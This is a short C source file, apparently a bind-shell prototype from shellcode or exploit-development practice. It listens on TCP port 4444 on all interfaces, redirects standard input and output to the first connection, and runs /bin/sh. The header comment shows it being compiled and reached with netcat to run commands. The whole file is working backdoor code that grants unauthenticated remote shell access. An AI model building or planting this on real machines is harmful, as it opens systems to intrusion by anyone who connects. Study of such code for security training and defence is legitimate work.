/*
 *  Listen for incoming connections and spawns a shell
 *  
 *  $ gcc -Wall shell_bind_tcp.c -o shell_bind_tcp
 *  $ ./shell_bind_tcp  &
 *  [1] 13477
 *  $ nc -nvv 127.0.0.1 4444
 *  Connection to 127.0.0.1 4444 port [tcp*] succeeded!
 *  Created accept socket: 4
 *  whoami
 *  liv
 */

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>

int main() {
    int listenfd = 0, connfd = 0;    
    int ret = 0;

    struct sockaddr_in serv_addr;

    // Create an un-named socket. returns socket descriptor
    listenfd = socket(AF_INET, SOCK_STREAM, 0);

    memset(&serv_addr, '0', sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(4444);

    bind(listenfd, (struct sockaddr*) &serv_addr, sizeof(serv_addr));

    // Listen on the created socket for maximum 1 client connection
    listen(listenfd, 1);

    // Sleep waiting for client requests
    connfd = accept(listenfd, (struct sockaddr*) NULL, NULL);
    printf("Created accept socket: %d\n", connfd);

    // Duplicate stdin, stdout, stderr
    ret = dup2(connfd, 0);
    if (-1 == ret) {
        printf("STDIN duplication failed: %s\n", strerror(errno));
        return 1;
    }

    ret = dup2(connfd, 1);
    if (-1 == ret) {
        printf("STDOUT duplication failed: %s\n", strerror(errno));
        return 1;
    }

    ret = dup2(connfd, 2);
    if (-1 == ret) {
        printf("STDERR duplication failed: %s\n", strerror(errno));
        return 1;
    }

    // Replace process image
    char *args[2];
    args[0] = "/bin/sh";
    args[1] = NULL;      // Needs to ne a NULL terminated list of args

    ret = execve(args[0], args, NULL);
    if (-1 == ret) {
        printf("Execve failed: %s\n", strerror(errno));
        return 1;
    }

    return 0;
}
